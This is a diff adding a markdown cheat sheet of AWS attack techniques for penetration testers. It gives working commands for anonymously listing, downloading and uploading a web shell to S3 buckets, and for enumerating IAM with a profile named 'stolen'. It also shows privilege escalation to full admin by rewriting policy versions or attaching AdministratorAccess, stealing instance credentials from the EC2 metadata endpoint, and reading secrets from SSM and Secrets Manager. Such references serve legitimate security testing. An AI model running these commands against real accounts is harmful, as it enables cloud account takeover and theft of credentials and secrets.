@@ -1,0 +1,243 @@
+# AWS Security Testing
+
+> Common AWS misconfigurations and attack techniques for penetration testers.
+
+---
+
+## 🔍 Recon & Enumeration
+
+```bash
+# Find AWS assets
+subfinder -d target.com | httpx | grep amazonaws
+amass enum -d target.com
+
+# Check for exposed S3 buckets
+# Common bucket names
+target-backup
+target-dev
+target-prod
+target-staging
+target-assets
+target-logs
+
+# Tools
+python3 s3scanner.py --buckets-file buckets.txt
+bucket-finder wordlist.txt
+```
+
+---
+
+## 🪣 S3 Bucket Attacks
+
+```bash
+# Check if bucket exists and is public
+curl -I https://target-bucket.s3.amazonaws.com
+
+# List bucket contents
+aws s3 ls s3://target-bucket --no-sign-request
+
+# Download files
+aws s3 cp s3://target-bucket/file.txt . --no-sign-request
+aws s3 sync s3://target-bucket/ ./local/ --no-sign-request
+
+# Upload file (if write enabled)
+aws s3 cp shell.php s3://target-bucket/ --no-sign-request
+
+# Check bucket ACL
+aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
+
+# Check bucket policy
+aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
+
+# Enumerate with authenticated creds
+aws s3 ls s3://target-bucket --profile attacker
+```
+
+---
+
+## 🔑 IAM Enumeration & Attacks
+
+```bash
+# With stolen credentials - set up profile
+aws configure --profile stolen
+# Enter: Access Key, Secret Key, Region
+
+# Who am I?
+aws sts get-caller-identity --profile stolen
+
+# List IAM users
+aws iam list-users --profile stolen
+
+# List IAM roles
+aws iam list-roles --profile stolen
+
+# List policies for user
+aws iam list-attached-user-policies --user-name username --profile stolen
+
+# Get policy details
+aws iam get-policy --policy-arn arn:aws:iam::123456789:policy/PolicyName --profile stolen
+aws iam get-policy-version --policy-arn arn:aws:iam::123456789:policy/PolicyName --version-id v1 --profile stolen
+
+# List groups
+aws iam list-groups --profile stolen
+aws iam list-group-policies --group-name groupname --profile stolen
+
+# Check what you can do
+aws iam simulate-principal-policy \
+  --policy-source-arn arn:aws:iam::123456789:user/username \
+  --action-names "s3:GetObject" "ec2:DescribeInstances" \
+  --profile stolen
+```
+
+---
+
+## 🔐 IAM Privilege Escalation
+
+```bash
+# If you have iam:CreatePolicyVersion
+aws iam create-policy-version \
+  --policy-arn arn:aws:iam::123456789:policy/ExistingPolicy \
+  --policy-document file://admin-policy.json \
+  --set-as-default --profile stolen
+
+# admin-policy.json
+{
+  "Version": "2012-10-17",
+  "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
+}
+
+# If you have iam:AttachUserPolicy
+aws iam attach-user-policy \
+  --user-name target-user \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
+  --profile stolen
+
+# If you have iam:PassRole + ec2:RunInstances
+# Launch EC2 with admin role attached
+
+# If you have lambda:CreateFunction + iam:PassRole
+# Create lambda with admin role and invoke it
+```
+
+---
+
+## ☁️ EC2 Metadata (SSRF/IMDS)
+
+```bash
+# IMDSv1 (no token required)
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
+
+# Get temp credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
+# Returns: AccessKeyId, SecretAccessKey, Token
+
+# Use temp credentials
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws sts get-caller-identity
+
+# IMDSv2 (token required)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+```
+
+---
+
+## 🔧 Common Misconfigurations
+
+```bash
+# Open security groups
+aws ec2 describe-security-groups --profile stolen | grep "0.0.0.0/0"
+
+# Unencrypted EBS volumes
+aws ec2 describe-volumes --query 'Volumes[?Encrypted==`false`]' --profile stolen
+
+# Public RDS snapshots
+aws rds describe-db-snapshots --include-public --profile stolen
+
+# Exposed Lambda environment variables
+aws lambda get-function-configuration --function-name target-function --profile stolen
+
+# CloudTrail disabled?
+aws cloudtrail describe-trails --profile stolen
+aws cloudtrail get-trail-status --name trail-name --profile stolen
+
+# Public AMIs
+aws ec2 describe-images --owners self --filters "Name=is-public,Values=true" --profile stolen
+
+# Secrets in Parameter Store (if access)
+aws ssm describe-parameters --profile stolen
+aws ssm get-parameter --name /prod/db/password --with-decryption --profile stolen
+
+# Secrets Manager
+aws secretsmanager list-secrets --profile stolen
+aws secretsmanager get-secret-value --secret-id prod/db/creds --profile stolen
+```
+
+---
+
+## 🛠️ Tools
+
+```bash
+# Pacu - AWS exploitation framework
+python3 pacu.py
+
+# ScoutSuite - multi-cloud security auditing
+python3 scout.py aws --profile stolen
+
+# Prowler - AWS security tool
+./prowler -p stolen
+
+# CloudMapper - visualize AWS environment
+python3 cloudmapper.py collect --account 123456789 --config config.json
+
+# enumerate-iam - brute force IAM permissions
+python3 enumerate-iam.py --access-key AKIA... --secret-key ...
+
+# truffleHog / gitleaks - find secrets in code
+trufflehog git https://github.com/target/repo
+```
+
+---
+
+## 📋 AWS Pentesting Checklist
+
+- [ ] Find exposed S3 buckets (public listing/read/write)
+- [ ] Check EC2 metadata endpoint (SSRF)
+- [ ] Enumerate IAM permissions with stolen creds
+- [ ] Check for privilege escalation paths
+- [ ] Look for secrets in Lambda env vars
+- [ ] Check SSM Parameter Store and Secrets Manager
+- [ ] Audit security groups for open ports
+- [ ] Check CloudTrail for logging gaps
+- [ ] Look for public RDS snapshots
+- [ ] Check unencrypted EBS volumes
+- [ ] Test for exposed EKS/ECS services
+- [ ] Look for hardcoded AWS keys in repos
+
+---
+
+## 🧠 Tips
+
+- **Pacu** is the best tool for AWS exploitation
+- Always check **IMDSv1** first — many old EC2s still use it
+- **enumerate-iam** helps when you don't know your permissions
+- Look for AWS keys in **GitHub, .env files, JS files**
+- **Confused deputy attacks** via cross-account roles
+- SNS/SQS misconfigurations can leak data
+
+---
+
+## 📚 References
+
+- [HackTricks AWS](https://book.hacktricks.xyz/pentesting-cloud/aws-security)
+- [Pacu GitHub](https://github.com/RhinoSecurityLabs/pacu)
+- [AWS Security Checklist](https://github.com/toniblyx/my-arsenal-of-aws-security-tools)
+- [CloudGoat - Vulnerable AWS Labs](https://github.com/RhinoSecurityLabs/cloudgoat)
+
+---
+
+*Notes by [@mtsboy01](https://github.com/mtsboy01) | MTS-SECURITY*
